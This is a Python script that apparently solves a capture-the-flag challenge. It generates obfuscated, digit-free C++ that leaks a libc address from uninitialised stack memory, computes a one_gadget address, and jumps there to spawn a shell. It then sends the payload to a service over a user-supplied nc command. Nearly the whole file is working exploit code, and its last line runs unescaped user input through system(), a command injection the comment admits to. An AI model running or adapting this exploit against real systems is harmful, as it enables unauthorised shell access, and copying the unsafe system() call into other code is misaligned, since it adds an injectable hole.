from time import sleep
from math import log2, floor
from random import seed, choice
from os import system
from _thread import start_new_thread
from sys import argv

spacing_amt = int(argv[1]) if len(argv) == 2 else 70
offset = 0x4c140  # one gadget address in libc.so.6 (pull from docker using `docker cp` and use `one_gadget` tool to check)

f = open('y.cpp', 'w')
f.write('int main() {\n')
f.write(''.join([f'unsigned long long spacing{i};\n' for i in range(spacing_amt)]))
f.write('unsigned long long** libcaddrptr;\n')
f.write('unsigned long long libcaddr;\n')
f.write(f'unsigned long long easy;\n')
f.write(f'easy and_eq main and not main;\n')
xor_nonsense = ' xor '.join([f'spacing{i}' for i in range(spacing_amt)])
f.write(f'easy or_eq {xor_nonsense} xor {xor_nonsense};\n')
f.write(f'libcaddr and_eq main and not main;\n')
f.write(f'libcaddr or_eq **libcaddrptr;\n')

for i in range(7):
    f.write(f'register unsigned long long zz{i};')
    f.write(f'zz{i} and_eq main and not main;')
xor_nonsense2 = ' xor '.join([f'zz{i}' for i in range(7)])
f.write(f'libcaddr or_eq {xor_nonsense2};\n')
#f.write(f'libcaddr or_eq {xor_nonsense2} xor {xor_nonsense2};')

f.write('unsigned long long zero;\nzero and_eq main and not main;\n')  # just in case operator precedence screws main and not main over
f.write('unsigned long long frepeating;\nfrepeating and_eq main and not main;\nfrepeating or_eq compl not not main;\n')
f.write('unsigned long long frepeatinge;\nfrepeatinge and_eq main and not main;\nfrepeatinge or_eq compl not main;\n')

def gen_n_pow2(name: str, n: int):
    '''generates a power of 2 and stores it in variable named p(2**n)'''
    assert floor(log2(n)) == log2(n)
    g = bin(n)[2:].rjust(64, '0')
    l = [f'unsigned long long {name};', f'{name} and_eq main and not main;', 
         f'{name} or_eq ' + '*'.join(floor(log2(n))*['frepeating*frepeatinge']) + f';']
    return '\n'.join(l)

print('unsigned long long p0;',file=f)
print('p0 and_eq main and not main;',file=f)
print('p0 or_eq not not main;',file=f)
for v in range(1, 64):
    print(gen_n_pow2(f'p{v}', 2**v),file=f)


alpha = 'abcdefghijklmnopqrstuvwxyz'


def get_name_n(n: int) -> str:
    """get name for get_n generated variable"""
    seed(n)
    name = ''.join([choice(alpha) for _ in range(10)])
    return name

gnn = get_name_n


def gen_n(n: int):
    """create code that defines a variable that contains a number. requires p0-p63"""
    name = get_name_n(n)
    thing = []
    for i, z in enumerate(bin(n)[2:].rjust(64, '0')[::-1]):
        if z == "1":
            thing.append(f'p{i}')
    if n == 0:
        thing = ['p0', 'p0']
    return '\n'.join([f'unsigned long long {name};', f'{name} and_eq main and not main;', f'{name} or_eq ' + ' xor '.join(thing) + ';'])


def full_adder(a, b, c, s, co):
    """pass in the varnames, create vars with varnames s and co for sum and carry out"""
    defs = [f'{co}x', f'{a}xr{b}', s, f'{a}and{b}', f'{a}and2{b}', co]
    total = []
    total.append(f'{a}xr{b} or_eq {a} xor {b};')
    total.append(f'{s} or_eq {a} xor {b} xor {c};')
    total.append(f'{a}and{b} or_eq {a} bitand {b};')
    total.append(f'{a}and2{b} or_eq {a}xr{b} and {c};')
    total.append(f'{co}x or_eq {a}and2{b} bitor {a}and{b};')
    total.append(f'{co} or_eq {co}x;')
    return defs, '\n'.join(total)


def fullest_adder(a: str, b: str, res: str):
    """full adders chained, creates res variable"""
    # tired of this shit
    defs = []
    t_o_t_s = lambda v, z: [defs.append(v),f'{v} or_eq {z};'][1]
    total = []
    total.append(t_o_t_s(f'c{a}{b}0', f'zero'));
    for i in range(64):
        total.append(t_o_t_s(f'{a}exad{i}', f'{a} bitand p{i}'))
        total.append(t_o_t_s(f'{a}exa{i}', f'{a}exad{i} and p1'))
        total.append(t_o_t_s(f'{b}exbd{i}', f'{b} bitand p{i}'))
        total.append(t_o_t_s(f'{b}exb{i}', f'{b}exbd{i} and p1'))
        defs2, text2 = full_adder(f'{a}exa{i}', f'{b}exb{i}', f'c{a}{b}{i}', f'r{a}{b}{i}', f'c{a}{b}{i+1}')
        defs.extend(defs2)
        total.append(text2)
    total.append(t_o_t_s(res, f'zero'));
    for i in range(64):
        total.append(f'{res} or_eq r{a}{b}{i} * p{i};')
    return defs, '\n'.join(total)



o = offset % (2**64)

f.write(gen_n(o))
defsfa, textfa = fullest_adder(gnn(o), 'easy', 'real')  # we add the libc address `easy` to the `offset` to get `real` variable
f.write(''.join([f"unsigned long long {vz};\n{vz} and_eq main and not main;\n" for vz in defsfa]))
f.write(f'easy or_eq libcaddr;')
f.write(textfa)
f.write(f'goto *real;\n')
f.write('\n}\n')
f.close()

with open('y.cpp') as f:
    data = f.read()
for n in [str(v) for v in range(10)]:
    data = data.replace(n, gnn(n) + alpha[int(n)] + gnn(n))
data = data.replace('\n', '')
data = data.replace('int main() {', '').replace('}', '')
with open('y2.cpp', 'w') as f:
    f.write(data)
    f.write('\n')
import os
os.environ['PWNLIB_NOTERM'] = '1'
from pwn import *
#system(f'''{{ sleep 2; docker cp y2.cpp $(docker ps -aq | head -n 1):/test.cpp ;}} &''')
#system('docker exec -it $(docker ps -aq | head -n 1) /bin/bash')

#nccmd = 'nc localhost 5000'
nccmd = input('nc cmd (e.g. nc localhost 5000) > ')
print('give it a few seconds, and then you will have a shell (once it says "lets do it")')
system(f'cat y2.cpp - | {nccmd}')  # command injection but i dont care because you would have to purposefully be bad

